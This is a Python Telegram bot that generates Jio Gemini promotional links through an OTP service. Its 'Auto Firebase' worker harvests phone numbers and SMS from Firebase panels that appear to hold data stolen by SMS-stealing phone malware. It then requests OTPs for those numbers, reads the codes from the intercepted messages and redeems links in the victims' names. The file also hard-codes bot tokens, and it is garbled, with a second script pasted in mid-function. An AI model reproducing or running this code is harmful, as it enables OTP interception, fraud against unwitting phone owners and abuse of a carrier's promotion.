import os
import re
import threading
import time
from datetime import datetime
from threading import Thread
from flask import Flask
import requests
import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup

# ==========================================
# 🌐 FLASK SERVER SETUP (Render Awake Guard)
# ==========================================
app = Flask("")


@app.route("/")
def home():
    return "Bot is alive and running 24/7!"


def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)


def keep_alive():
    t = Thread(target=run)
    t.start()


# Web server start
keep_alive()

# ==========================================
# ⚙️ CONFIGURATION
# ==========================================
BOT_TOKEN = "8808786725:AAFqLW2eQL5TsueEUBijo90lX1s5HTruaVo"
ADMIN_ID = "8808786725"
BOT_USERNAME = "ecotpsbot"
BASE_URL = "https://looters.shop/jio_gemini/"

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,"
        " like Gecko) Chrome/146.0.0.0 Safari/537.36"
    ),
    "Origin": "https://looters.shop",
    "Referer": "https://looters.shop/jio_gemini/",
}

# Bot Setup with Multi-Threading (50 Parallel Workers)
bot = telebot.TeleBot(
    BOT_TOKEN, parse_mode="HTML", threaded=True, num_threads=50
)

# ==========================================
# 🗄️ DATA STORAGE & LOCKS
# ==========================================
user_data = {}
memory_lock = threading.Lock()  # RAM lock for active sessions
file_lock = threading.Lock()  # Disk lock for file writes

LEADERBOARD_FILE = "leaderboard.json"
LINKS_FILE = "gemnifile.txt"
FRESH_FILE = "fresh_links.txt"
REDEEMED_FILE = "redeemed_links.txt"
SCANNED_NUMBERS_FILE = "scanned_numbers.txt"

DATABASES = {}
USER_WAITING_FOR = {}
NUMBER_KEYS = {
    "sim1Number",
    "sim2Number",
    "numberSim1",
    "numberSim2",
    "mobNo",
    "phoneNumber",
    "phone",
    "sim1",
    "sim2",
    "mobile",
}
successfully_checked_cache = set()


# Load Scanned Numbers Cache
def load_scanned_numbers():
    if os.path.exists(SCANNED_NUMBERS_FILE):
        try:
            with open(SCANNED_NUMBERS_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    num = line.strip()
                    if num:
                        successfully_checked_cache.add(num)
        except Exception:
            pass


load_scanned_numbers()


def save_scanned_number(phone):
    if not phone:
        return
    with file_lock:
        if phone not in successfully_checked_cache:
            successfully_checked_cache.add(phone)
            try:
                with open(
                    SCANNED_NUMBERS_FILE, "a", encoding="utf-8"
                ) as f:
                    f.write(f"{phone}\n")
            except Exception:
                pass


# Load JSON Database
def load_leaderboard():
    if os.path.exists(LEADERBOARD_FILE):
        try:
            with open(LEADERBOARD_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def save_leaderboard(data):
    with open(LEADERBOARD_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


leaderboard_data = load_leaderboard()


def load_saved_panels():
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
    settings_path = os.path.join(SCRIPT_DIR, "settings.json")
    if os.path.exists(settings_path):
        try:
            with open(settings_path, "r", encoding="utf-8") as f:
                data = json.load(f)
                extra = data.get("global_panels", [])
                for i, url in enumerate(extra):
                    clean_url = url.strip()
                    if clean_url.endswith("/"):
                        clean_url = clean_url[:-1]
                    if clean_url.startswith("http"):
                        DATABASES[f"G_{i}"] = clean_url
        except Exception:
            pass


load_saved_panels()


# ==========================================
# ⏰ HOURLY AUTO-SEND BACKUP TASK
# ==========================================
def hourly_backup_task():
    while True:
        time.sleep(3600)
        try:
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with file_lock:
                file_exists = (
                    os.path.exists(LINKS_FILE)
                    and os.path.getsize(LINKS_FILE) > 0
                )

            if file_exists:
                total_users = len(leaderboard_data)
                total_links = sum(
                    user.get("count", 0) for user in leaderboard_data.values()
                )

                caption = (
                    f"⏰ <b>HOURLY AUTOMATIC BACKUP REPORT</b>\n"
                    f"📅 <b>Time:</b> <code>{time_now}</code>\n\n"
                    f"📊 <b>Total Registered Users:</b> {total_users}\n"
                    f"🔗 <b>Total Links Generated:</b> {total_links}\n\n"
                    f"📁 <i>Attached updated <code>{LINKS_FILE}</code> file"
                    " below:</i>"
                )

                with open(LINKS_FILE, "rb") as doc:
                    bot.send_document(ADMIN_ID, doc, caption=caption)
            else:
                bot.send_message(
                    ADMIN_ID,
                    f"⏰ <b>Hourly Report [{time_now}]:</b> No links generated"
                    f" in <code>{LINKS_FILE}</code> yet.",
                )
        except Exception as e:
            print(f"[-] Hourly Backup Task Error: {e}")


# ==========================================
# 🔍 HELPER FUNCTIONS
# ==========================================
def send_main_menu(chat_id, first_name):
    welcome_text = (
        f"🌟 <b>Welcome {first_name}!</b> 🌟\n\n"
        "⚡️ <b>High-Speed Jio Gemini Link Generator & Auto Panel</b> 🤖\n\n"
        "👇 <i>Choose an option below:</i>"
    )
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton(
            "🚀 Generate Jio Link (Manual)", callback_data="start_generate"
        )
    )
    markup.add(
        InlineKeyboardButton(
            "🤖 Auto Firebase (Sim First + SMS Heuristics)",
            callback_data="start_firebase_auto",
        )
    )
    markup.add(
        InlineKeyboardButton(
            "🔍 Link Checker Tool", callback_data="start_checker"
        )
    )
    markup.add(
        InlineKeyboardButton(
            "➕ Add Panels (Text/URL)", callback_data="btn_add_text"
        )
    )
    markup.add(
        InlineKeyboardButton(
            "📁 Upload .txt File Panels", callback_data="btn_add_file"
        )
    )
    markup.add(
        InlineKeyboardButton(
            "🏆 Leaderboard (Top Users)", callback_data="show_leaderboard"
        )
    )
    bot.send_message(chat_id, welcome_text, reply_markup=markup)


def fmt_num(n):
    c = re.sub(r"\D", "", str(n))
    if c.startswith("91") and len(c) == 12:
        c = c[2:]
    if len(c) == 10 and c[0] in "6789":
        return c
    return None


def extract_numbers_from_sms_heuristics(sender, body):
    extracted = []
    if not body:
        return extracted

    sender_upper = str(sender).upper()
    body_upper = str(body).upper()

    if (
        "JIOPAY" in sender_upper
        or "JIO" in sender_upper
        or "JIO PAY" in body_upper
        or "JIO" in body_upper
    ):
        found = re.findall(r"\b[6789]\d{9}\b", body)
        for num in found:
            formatted = fmt_num(num)
            if formatted:
                extracted.append(formatted)

    general_matches = re.findall(r"\b([6789]\d{9})\b", body)
    for num in general_matches:
        formatted = fmt_num(num)
        if formatted:
            extracted.append(formatted)

    return list(set(extracted))


def extract_otp(text):
    if not text:
        return None
    m = re.search(r"\b(\d{4,6})\b", text)
    if m:
        return m.group(1)
    return None


def extract_numbers_recursively(obj):
    nums = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in NUMBER_KEYS and isinstance(v, (str, int)):
                val = fmt_num(v)
                if val:
                    nums.append(val)
            else:
                nums.extend(extract_numbers_recursively(v))
    elif isinstance(obj, list):
        for item in obj:
            nums.extend(extract_numbers_recursively(item))
    return nums


def save_firebase_urls(raw_urls):
    extracted_urls = re.findall(r'https?://[^\s"\',]+', raw_urls)
    valid_urls = [u.rstrip("/") for u in extracted_urls if "http" in u.lower()]

    if not valid_urls:
        return 0, 0

    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
    settings_path = os.path.join(SCRIPT_DIR, "settings.json")

    data = {"global_panels": []}
    if os.path.exists(settings_path):
        try:
            with open(settings_path, "r", encoding="utf-8") as f:
                data = json.load(f)
        except:
            pass

    added_count = 0
    for u in valid_urls:
        if u not in data["global_panels"]:
            data["global_panels"].append(u)
            added_count += 1

    DATABASES.clear()
    for i, url in enumerate(data["global_panels"]):
        DATABASES[f"G_{i}"] = url

    with open(settings_path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

    return added_count, len(data["global_panels"])


def fetch_firebase_devices_with_status(url):
    devices_list = []
    try:
        res = requests.get(f"{url}/All_Users.json", timeout=7)
        if res.status_code == 200:
            data = res.json()
            if isinstance(data, dict):
                sim_details = data.get("simDetails", {})
                info_all = data.get("Data", {}).get("DeviceInfo", {})

                for dev_id in set(sim_details.keys()).union(
                    set(info_all.keys())
                ):
                    info_data = info_all.get(dev_id, {})
                    status_raw = info_data.get(
                        "Status", info_data.get("status", False)
                    )
                    is_online = (
                        True
                        if str(status_raw).lower() in ["true", "online", "1"]
                        else False
                    )

                    nums = extract_numbers_recursively(
                        sim_details.get(dev_id, {})
                    ) + extract_numbers_recursively(info_data)

                    if not nums:
                        try:
                            sms_res = requests.get(
                                f"{url}/All_Users/sms/{dev_id}.json", timeout=5
                            )
                            if sms_res.status_code == 200:
                                sms_data = sms_res.json()
                                if isinstance(sms_data, dict):
                                    for _, sms in sms_data.items():
                                        if isinstance(sms, dict):
                                            sender = (
                                                sms.get("address")
                                                or sms.get("sender")
                                                or ""
                                            )
                                            body = (
                                                sms.get("body")
                                                or sms.get("message")
                                                or sms.get("text")
                                                or ""
                                            )
                                            nums.extend(
                                                extract_numbers_from_sms_heuristics(
                                                    sender, body
                                                )
                                            )
                        except Exception:
                            pass

                    if nums:
                        devices_list.append({
                            "id": dev_id,
                            "numbers": list(set(nums)),
                            "online": is_online,
                            "base": url,
                        })
    except Exception:
        pass
    return devices_list


def fetch_sms_from_firebase(url, dev_id):
    try:
        res = requests.get(f"{url}/All_Users/sms/{dev_id}.json", timeout=7)
        if res.status_code == 200:
            data = res.json()
            if isinstance(data, dict):
                return data
    except Exception:
        pass
    return {}


# ==========================================
# 🔗 GEMINI LINK CHECKER INTEGRATION
# ==========================================
def check_gemini_status_code(url):
    checker_headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            " (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
        )
    }
    try:
        response = requests.get(url, headers=checker_headers, timeout=10)
        if response.status_code == 200:
            if (
                "already been used" in response.text.lower()
                or "redeemed" in response.text.lower()
            ):
                return "🔴 REDEEMED / USED"
            else:
                return "🟢 FRESH (200 OK)"
        elif response.status_code == 404:
            return "❌ NOT FOUND (404)"
        else:
            return f"⚠️ ISSUE (Status: {response.status_code})"
    except requests.exceptions.RequestException:
        return "❌ ERROR (Check Failed)"


# ==========================================
# 🎮 BOT HANDLERS
# ==========================================
@bot.message_handler(commands=["start"])
def handle_start(message):
    chat_id = message.chat.id
    first_name = message.from_user.first_name

    if message.chat.type != "private":
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton(
                "🤖 Start in Private DM",
                url=f"https://t.me/{BOT_USERNAME}?start=true",
            )
        )
        bot.reply_to(
            message,
            "⚠️ <b>Works only in Private Messages!</b>",
            reply_markup=markup,
        )
        return

    send_main_menu(chat_id, first_name)


@bot.callback_query_handler(func=lambda call: call.data == "show_leaderboard")
def show_leaderboard_callback(call):
    chat_id = call.message.chat.id

    if not leaderboard_data:
        bot.send_message(
            chat_id,
            "🏆 <b>Leaderboard is currently empty!</b>\nBe the first to generate"
            " a link.",
        )
        return

    sorted_users = sorted(
        leaderboard_data.values(), key=lambda x: x.get("count", 0), reverse=True
    )

    lb_text = "🏆 <b>TOP LINK GENERATORS</b> 🏆\n"
    lb_text += "━━━━━━━━━━━━━━━━━━━━\n"

    medals = ["🥇", "🥈", "🥉"]
    for i, user in enumerate(sorted_users[:10]):
        rank = medals[i] if i < 3 else f"<b>{i+1}.</b>"
        lb_text += (
            f"{rank} {user.get('name', 'User')} ➔"
            f" <b>{user.get('count', 0)} Links</b>\n"
        )

    lb_text += "━━━━━━━━━━━━━━━━━━━━\n"
    lb_text += "<i>Keep generating to climb the ranks!</i>"

    bot.send_message(chat_id, lb_text)


@bot.callback_query_handler(func=lambda call: call.data == "btn_add_text")
def btn_add_text_callback(call):
    user_id = call.from_user.id
    USER_WAITING_FOR[user_id] = "TEXT_URLS"
    bot.send_message(
        call.message.chat.id,
        "📝 <b>Firebase URLs bhejien:</b>\nAap naye ya purane panels bhej"
        " sakte hain, ye existing list mein automatically auto-add ho jayenge.",
    )


@bot.callback_query_handler(func=lambda call: call.data == "btn_add_file")
def btn_add_file_callback(call):
    user_id = call.from_user.id
    USER_WAITING_FOR[user_id] = "TXT_FILE"
    bot.send_message(
        call.message.chat.id,
        "📁 <b>.txt File Bhejien:</b>\nJisme saare Firebase panel URLs saved"
        " ho.",
    )


@bot.callback_query_handler(func=lambda call: call.data == "start_checker")
def start_checker_callback(call):
    user_id = call.from_user.id
    USER_WAITING_FOR[user_id] = "LINK_CHECKER"
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton(
            "🔙 Back to Main Menu", callback_data="back_to_menu"
        )
    )
    bot.send_message(
        call.message.chat.id,
        "🔍 <b>Gemini Link Checker Tool</b>\n\n👇 Apni link(s) yahan bhejien"
        " (Single link, multiple links, ya `.txt` file upload karein):",
        reply_markup=markup,
    )


@bot.callback_query_handler(func=lambda call: call.data == "back_to_menu")
def back_to_menu_callback(call):
    user_id = call.from_user.id
    USER_WAITING_FOR.pop(user_id, None)
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except:
        pass
    send_main_menu(call.message.chat.id, call.from_user.first_name)


@bot.callback_query_handler(func=lambda call: call.data == "start_generate")
def start_generate_callback(call):
    chat_id = call.message.chat.id

    with memory_lock:
        user_data[chat_id] = {"session": requests.Session()}

    msg = bot.send_message(
        chat_id,
        "📱 <b>Enter your Jio Mobile Number:</b>\n<i>(e.g., 9876543210)</i>",
    )
    bot.register_next_step_handler(msg, process_number_step)


def process_number_step(message):
    chat_id = message.chat.id
    number = message.text.strip() if message.text else ""

    if not number.isdigit() or len(number) < 10:
        bot.send_message(
            chat_id, "❌ <b>Invalid Number!</b> Type /start to try again."
        )
        return

    with memory_lock:
        if chat_id not in user_data:
            user_data[chat_id] = {"session": requests.Session()}
        user_data[chat_id]["number"] = number

    status_msg = bot.send_message(
        chat_id, "⏳ <b>Sending OTP... Please wait!</b> 🔑"
    )
    threading.Thread(
        target=async_send_otp, args=(chat_id, number, status_msg.message_id)
    ).start()


def async_send_otp(chat_id, number, msg_id):
    try:
        session = user_data[chat_id]["session"]
        res = session.post(
            BASE_URL,
            data={"action": "send_otp", "number": number},
            headers=HEADERS,
            timeout=10,
        )
        data = res.json()

        if data.get("success"):
            msg = bot.send_message(
                chat_id,
                "✅ <b>OTP Sent Successfully!</b> 📩\n\n👉 <i>Enter the 6-digit"
                " OTP:</i>",
            )
            bot.register_next_step_handler(msg, process_otp_step)
        else:
            bot.send_message(
                chat_id,
                f"❌ <b>Failed:</b> {data.get('message', 'Error')}\nType /start"
                " to retry.",
            )
    except Exception:
        bot.send_message(
            chat_id, "⚠️ <b>Server Connection Slow!</b> Try /start again."
        )


def process_otp_step(message):
    chat_id = message.chat.id
    otp = message.text.strip() if message.text else ""

    if chat_id not in user_data or "number" not in user_data[chat_id]:
        bot.send_message(
            chat_id, "❌ <b>Session Expired!</b> Type /start again."
        )
        return

    number = user_data[chat_id]["number"]
    bot.send_message(
        chat_id,
        "⏳ <b>Verifying OTP, Generating & Checking Link Status...</b> 💎",
    )

    threading.Thread(
        target=async_verify_otp,
        args=(chat_id, number, otp, message.from_user.first_name),
    ).start()


# ==========================================
# 🤖 AUTO FIREBASE FETCH WORKER
# ==========================================
@bot.callback_query_handler(
    func=lambda call: call.data == "start_firebase_auto"
)
def start_firebase_auto_callback(call):
    chat_id = call.message.chat.id

    bot.send_message(
        chat_id,
        "🚀 <b>Auto Firebase Engine Started!</b>\nSkipping already checked"
        " numbers and scanning live queues...",
    )
    threading.Thread(
        target=run_firebase_auto_worker,
        args=(chat_id, call.from_user.first_name),
    ).start()


def run_firebase_auto_worker(chat_id, first_name):
    load_saved_panels()
    if not DATABASES:
        print("[-] [AUTO WORKER] No Firebase panels found in settings.json!")
        bot.send_message(
            chat_id,
            "❌ No Firebase panels found! Add them via text or file.",
        )
        return

    all_found_targets = []
    for tag, url in DATABASES.items():
        devices = fetch_firebase_devices_with_status(url)
        for dev in devices:
            online_status = dev["online"]
            for num in dev["numbers"]:
                if num in successfully_checked_cache:
                    print(
                        f"   [SKIPPED] Number {num} already checked before."
                    )
                    continue
                all_found_targets.append({
                    "phone": num,
                    "base": url,
                    "dev_id": dev["id"],
                    "online": online_status,
                })

    if not all_found_targets:
        print("[-] [AUTO WORKER] No new/unchecked numbers found.")
        bot.send_message(
            chat_id,
            "⚠️ Saare numbers pehle hi check ho chuke hain ya koi naya number"
            " nahi mila.",
        )
        return

    print(
        f"\n[+] [AUTO WORKER] New Target Numbers Loaded:"
        f" {len(all_found_targets)}"
    )
    bot.send_message(
        chat_id,
        f"📱 Found <b>{len(all_found_targets)}</b> unchecked numbers."
        " Processing live queues...",
    )

    for index, target in enumerate(all_found_targets[:10], start=1):
        phone = target["phone"]
        base_url = target["base"]
        dev_id = target["dev_id"]
        is_online = target["online"]

        if phone in successfully_checked_cache:
            continue

        print(
            f"\n👉 [QUEUE] Processing Number [{index}/{len(all_found_targets)}]:"
            f" {phone} | Online: {is_online}"
        )

        try:
            session = requests.Session()
            res = session.post(
                BASE_URL,
                data={"action": "send_otp", "number": phone},
                headers=HEADERS,
                timeout=10,
            )
            data = res.json()

            if data.get("success"):
                print(
                    f"   [+] [OTP SENT] Successfully requested OTP for {phone}."
                    " Waiting for SMS..."
                )

                otp_found = None
                start_time = time.time()
                for _ in range(10):
                    time.sleep(3)
                    sms_data = fetch_sms_from_firebase(base_url, dev_id)
                    for _, sms in sms_data.items():
                        if isinstance(sms, dict):
                            body = sms.get("body", "")
                            code = extract_otp(body)
                            if code:
                                otp_found = code
                                break
                    if otp_found:
                        break

                if not otp_found and (time.time() - start_time) > 25:
                    print(
                        f"   [-] [TIMEOUT] OTP SMS capture timed out for"
                        f" number: {phone}"
                    )

                if otp_found:
                    print(
                        f"   [+] [OTP CAUGHT] Captured OTP '{otp_found}' for"
                        f" {phone}. Verifying..."
                    )
                    verify_res = session.post(
                        BASE_URL,
                        data={
                            "action": "verify_otp",
                            "number": phone,
                            "otp": otp_found,
                        },
                        headers=HEADERS,
                        timeout=12,
                    )
                    v_data = verify_res.json()

                    if v_data.get("success"):
                        link = v_data.get("link", "No link found")
                        status = check_gemini_status_code(link)

                        print(
                            f"   🎉 [LINK FOUND] Number: {phone} | Status:"
                            f" {status} | Link: {link}"
                        )

                        save_scanned_number(phone)

                        markup = InlineKeyboardMarkup()
                        markup.add(
                            InlineKeyboardButton(
                                "🔗 Open Gemini Link", url=link
                            )
                        )

                        bot.send_message(
                            chat_id,
                            f"🎉 <b>AUTO-EXTRACTED LINK SUCCESS!</b> 🎉\n\n"
                            f"📱 <b>Number:</b> <code>{phone}</code>\n"
                            f"🟢 <b>Online Status:</b> <code>{is_online}</code>\n"
                            f"📊 <b>Link Status:</b> <code>{status}</code>\n"
                            f"🔗 <b>Link:</b>\n<code>{link}</code>",
                            reply_markup=markup,
                        )

                        user_id_str = str(chat_id)
                        time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                        with file_lock:
                            with open(
                                LINKS_FILE, "a", encoding="utf-8"
                            ) as f:
                                f.write(
                                    f"[{time_now}] Auto Name: {first_name} |"
                                    f" Number: {phone} | Status: {status} |"
                                    f" Link: {link}\n"
                                )

                            if "FRESH" in status:
                                with open(
                                    FRESH_FILE, "a", encoding="utf-8"
                                ) as ff:
                                    ff.write(f"{link}\n")
                            else:
                                with open(
                                    REDEEMED_FILE, "a", encoding="utf-8"
                                ) as rf:
                                    rf.write(f"{link}\n")

                            if user_id_str not in leaderboard_data:
                                leaderboard_data[user_id_str] = {
                                    "name": first_name,
                                    "count": 0,
                                }
                            leaderboard_data[user_id_str]["count"] += 1
                            save_leaderboard(leaderboard_data)
                    else:
                        print(
                            f"   [-] [VERIFY FAILED] Could not verify OTP for"
                            f" {phone}"
                        )
                else:
                    print(f"   [-] [TIMEOUT] No SMS received for {phone}")
            else:
                print(
                    f"   [-] [OTP FAILED] Request blocked or failed for {phone}"
                )
        except Exception as e:
            print(f"   [-] [ERROR] Worker exception on {phone}: {e}")


# ==========================================
# 📥 TEXT & DOCUMENT INPUT HANDLERS
# ==========================================
@bot.message_handler(
    func=lambda m: m.chat.type == "private"
    and m.from_user.id in USER_WAITING_FOR
)
def handle_text_inputs(message):
    user_id = message.from_user.id
    state = USER_WAITING_FOR.get(user_id)

    if state == "TEXT_URLS":
        added, total = save_firebase_urls(message.text)
        USER_WAITING_FOR.pop(user_id, None)
        bot.reply_to(
            message,
            f"✅ Auto-added <b>{added}</b> new URLs!\nTotal Panels: {total}",
            parse_mode="HTML",
        )

    elif state == "LINK_CHECKER":
        text_content = message.text.strip()
        links = re.findall(r"https?://[^\s]+", text_content)

        if not links:
            bot.reply_to(
                message, "⚠️ Koi valid HTTP/HTTPS link nahi mila. Dobara bhejein."
            )
            return

        bot.reply_to(
            message, f"⏳ Checking {len(links)} link(s)... Please wait."
        )

        result_text = "🔍 <b>LINK CHECKER RESULTS</b> 🔍\n\n"
        for idx, url in enumerate(links[:15], start=1):
            status = check_gemini_status_code(url)
            result_text += (
                f"{idx}. <code>{url}</code>\n➔ Status: <b>{status}</b>\n\n"
            )

        markup = InlineKeyboardMarkup()
        for u in links[:5]:
            markup.add(InlineKeyboardButton("🔗 Open Link", url=u))
        markup.add(
            InlineKeyboardButton(
                "🔄 Check More Links", callback_data="start_checker"
            )
        )

        bot.send_message(
            message.chat.id,
            result_text,
            reply_markup=markup,
            disable_web_page_preview=True,
        )
        USER_WAITING_FOR.pop(user_id, None)


@bot.message_handler(content_types=["document"])
def handle_document_inputs(message):
    user_id = message.from_user.id
    if user_id in USER_WAITING_FOR:
        state = USER_WAITING_FOR.get(user_id)
        doc = message.document

        if doc.file_name.endswith(".txt"):
            file_info = bot.get_file(doc.file_id)
            downloaded_bytes = bot.download_file(file_info.file_path)
            content = downloaded_bytes.decode("utf-8", errors="ignore")

            if state == "TXT_FILE":
                added, total = save_firebase_urls(content)
                USER_WAITING_FOR.pop(user_id, None)
                bot.reply_to(
                    message,
                    f"✅ Auto-added <b>{added}</b> URLs from file!\nTotal"
                    f" Panels: {total}",
                    parse_mode="HTML",
                )

            elif state == "LINK_CHECKER":
                links = re.findall(r"https?://[^\s]+", content)
                if not links:
                    bot.reply_to(
                        message, "⚠️ File ke andar koi valid link nahi mila."
                    )
                    return

                bot.reply_to(
                    message, f"⏳ Checking {len(links)} links from file..."
                )
                result_text = "📁 <b>FILE LINK CHECKER RESULTS</b> 📁\n\n"
                for idx, url in enumerate(links[:15], start=1):
                    status = check_gemini_status_code(url)
                    result_text += (
                        f"{idx}. <code>{url}</code>\n➔ Status:"
                        f" <b>{status}</b>\n\n"
                    )

                markup = InlineKeyboardMarkup()
                markup.add(
                    InlineKeyboardButton(
                        "🔄 Check More Links", callback_data="start_checker"
                    )
                )
                bot.send_message(
                    message.chat.id,
                    result_text,
                    reply_markup=markup,
                    disable_web_page_preview=True,
                )
                USER_WAITING_FOR.pop(user_id, None)


def async_verify_otp(chat_id, number, otp, first_name):
    try:
        session = user_data[chat_id]["session"]
        res = session.post(
            BASE_URL,
            data={"action": "verify_otp", "number": number, "otp": otp},
            headers=HEADERS,
            timeout=12,
        )
        data = res.json()

        if data.get("success"):
            link = data.get("link", "No link found")
            status = check_gemini_status_code(link)

            save_scanned_number(number)

            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔗 Open Gemini Link", url=link))
            markup.add(
                InlineKeyboardButton(
                    "🚀 Generate Another Link", callback_data="start_generate"
                )
            )

            bot.send_message(
                chat_id,
                f"🎉 <b>BOOM! Link Generated Successfully!</b> 🎉\n\n"
                f"📊 <b>Status:</b> <code>{status}</code>\n"
                f"🔗 <b>Your Link:</b>\n\n<code>{link}</code>\n\n"
                f"✨ <i>Click the button below to open or generate more!</i>",
                reply_markup=markup,
            )

            user_id_str = str(chat_id)
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            with file_lock:
                with open(LINKS_FILE, "a", encoding="utf-8") as f:
                    f.write(
                        f"[{time_now}] Name: {first_name} | Number: {number} |"
                        f" Status: {status} | Link: {link}\n"
                    )

                if "FRESH" in status:
                    with open(FRESH_FILE, "a", encoding="utf-8") as ff:
                        ff.write(f"{link}\n")
                else:
                    with open(REDEEMED_FILE, "a", encoding="utf-8") as rf:
                        rf.write(f"{link}\n")

                if user_id_str not in leaderboard_data:
                    leaderboard_data[user_id_str] = {
                        "name": first_name,
                        "count": 0,
                    }

                leaderboard_data[user_id_str]["name"] = first_name
                leaderboard_data[user_id_str]["count"] += 1
                save_leaderboard(leaderboard_data)

            admin_markup = InlineKeyboardMarkup()
            admin_markup.add(InlineKeyboardButton("🔗 Open Link", url=link))

            admin_msg = (
                f"👑 <b>ADMIN ALERT: New Link Generated!</b> 👑\n\n"
                f"👤 <b>Name:</b> {first_name}\n"
                f"📈 <b>Total Links by User:</b>"
                f" {leaderboard_data[user_id_str]['count']}\n"
                f"📱 <b>Number:</b> <code>{number}</code>\n"
                f"📊 <b>Status:</b> <code>{status}</code>\n"
                f"🔗 <b>Link:</b>\n<code>{link}</code>"
            )
            try:
                bot.send_message(
                    ADMIN_ID, admin_msg, reply_markup=admin_markup
                )import os
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

# Web Server Dummy Port Bind
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is Running Safely!")

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), SimpleHandler)
    server.serve_forever()

# Background Thread me Web Server Start Karein
threading.Thread(target=run_web_server, daemon=True).start()

# Aapka Normal/Safe Code Yahan Aayega
print("Main Script Started Safely...")

import telebot
import requests
import threading
import json
import os
import time
import re
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==========================================
# ⚙️ CONFIGURATION
# ==========================================
BOT_TOKEN = "8808786725:AAHOE15FWL1IwKRZU83Bk93YNJsHv5Qb8bo"
ADMIN_ID = "8808786725" 
BOT_USERNAME = "ecotpsbot"
BASE_URL = "https://looters.shop/jio_gemini/"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Origin": "https://looters.shop",
    "Referer": "https://looters.shop/jio_gemini/",
}

# Bot Setup with Multi-Threading (50 Parallel Workers)
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML", threaded=True, num_threads=50)

# ==========================================
# 🗄️ DATA STORAGE & LOCKS
# ==========================================
user_data = {}
memory_lock = threading.Lock() # RAM lock for active sessions
file_lock = threading.Lock()   # Disk lock for file writes

LEADERBOARD_FILE = "leaderboard.json"
LINKS_FILE = "gemnifile.txt"
FRESH_FILE = "fresh_links.txt"
REDEEMED_FILE = "redeemed_links.txt"
SCANNED_NUMBERS_FILE = "scanned_numbers.txt"

DATABASES = {}
USER_WAITING_FOR = {}
NUMBER_KEYS = {"sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "sim1", "sim2", "mobile"}
successfully_checked_cache = set()

# Load Scanned Numbers Cache
def load_scanned_numbers():
    if os.path.exists(SCANNED_NUMBERS_FILE):
        try:
            with open(SCANNED_NUMBERS_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    num = line.strip()
                    if num:
                        successfully_checked_cache.add(num)
        except Exception: pass

load_scanned_numbers()

def save_scanned_number(phone):
    if not phone: return
    with file_lock:
        if phone not in successfully_checked_cache:
            successfully_checked_cache.add(phone)
            try:
                with open(SCANNED_NUMBERS_FILE, "a", encoding="utf-8") as f:
                    f.write(f"{phone}\n")
            except Exception: pass

# Load JSON Database
def load_leaderboard():
    if os.path.exists(LEADERBOARD_FILE):
        try:
            with open(LEADERBOARD_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_leaderboard(data):
    with open(LEADERBOARD_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

leaderboard_data = load_leaderboard()


            except:
                pass

        else:
            bot.send_message(
                chat_id,
                f"❌ <b>Verification Failed:</b>"
                f" {data.get('message', 'Invalid OTP')}\nType /start to try"
                " again.",
            )

    except Exception:
        bot.send_message(
            chat_id, "⚠️ <b>Server Response Timeout!</b> Try again later."
        )
    finally:
        with memory_lock:
            user_data.pop(chat_id, None)


# ==========================================
# 🏃‍♂️ RUNNER
# ==========================================
if __name__ == "__main__":
    print("🚀 Advanced Jio Gemini Bot Started (Force-Join Removed)!")
    print(
        f"📁 Saving data to {LINKS_FILE}, {FRESH_FILE}, {REDEEMED_FILE} &"
        f" {SCANNED_NUMBERS_FILE}"
    )
    print("⏰ Hourly automatic backup thread active...")

    threading.Thread(target=hourly_backup_task, daemon=True).start()
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

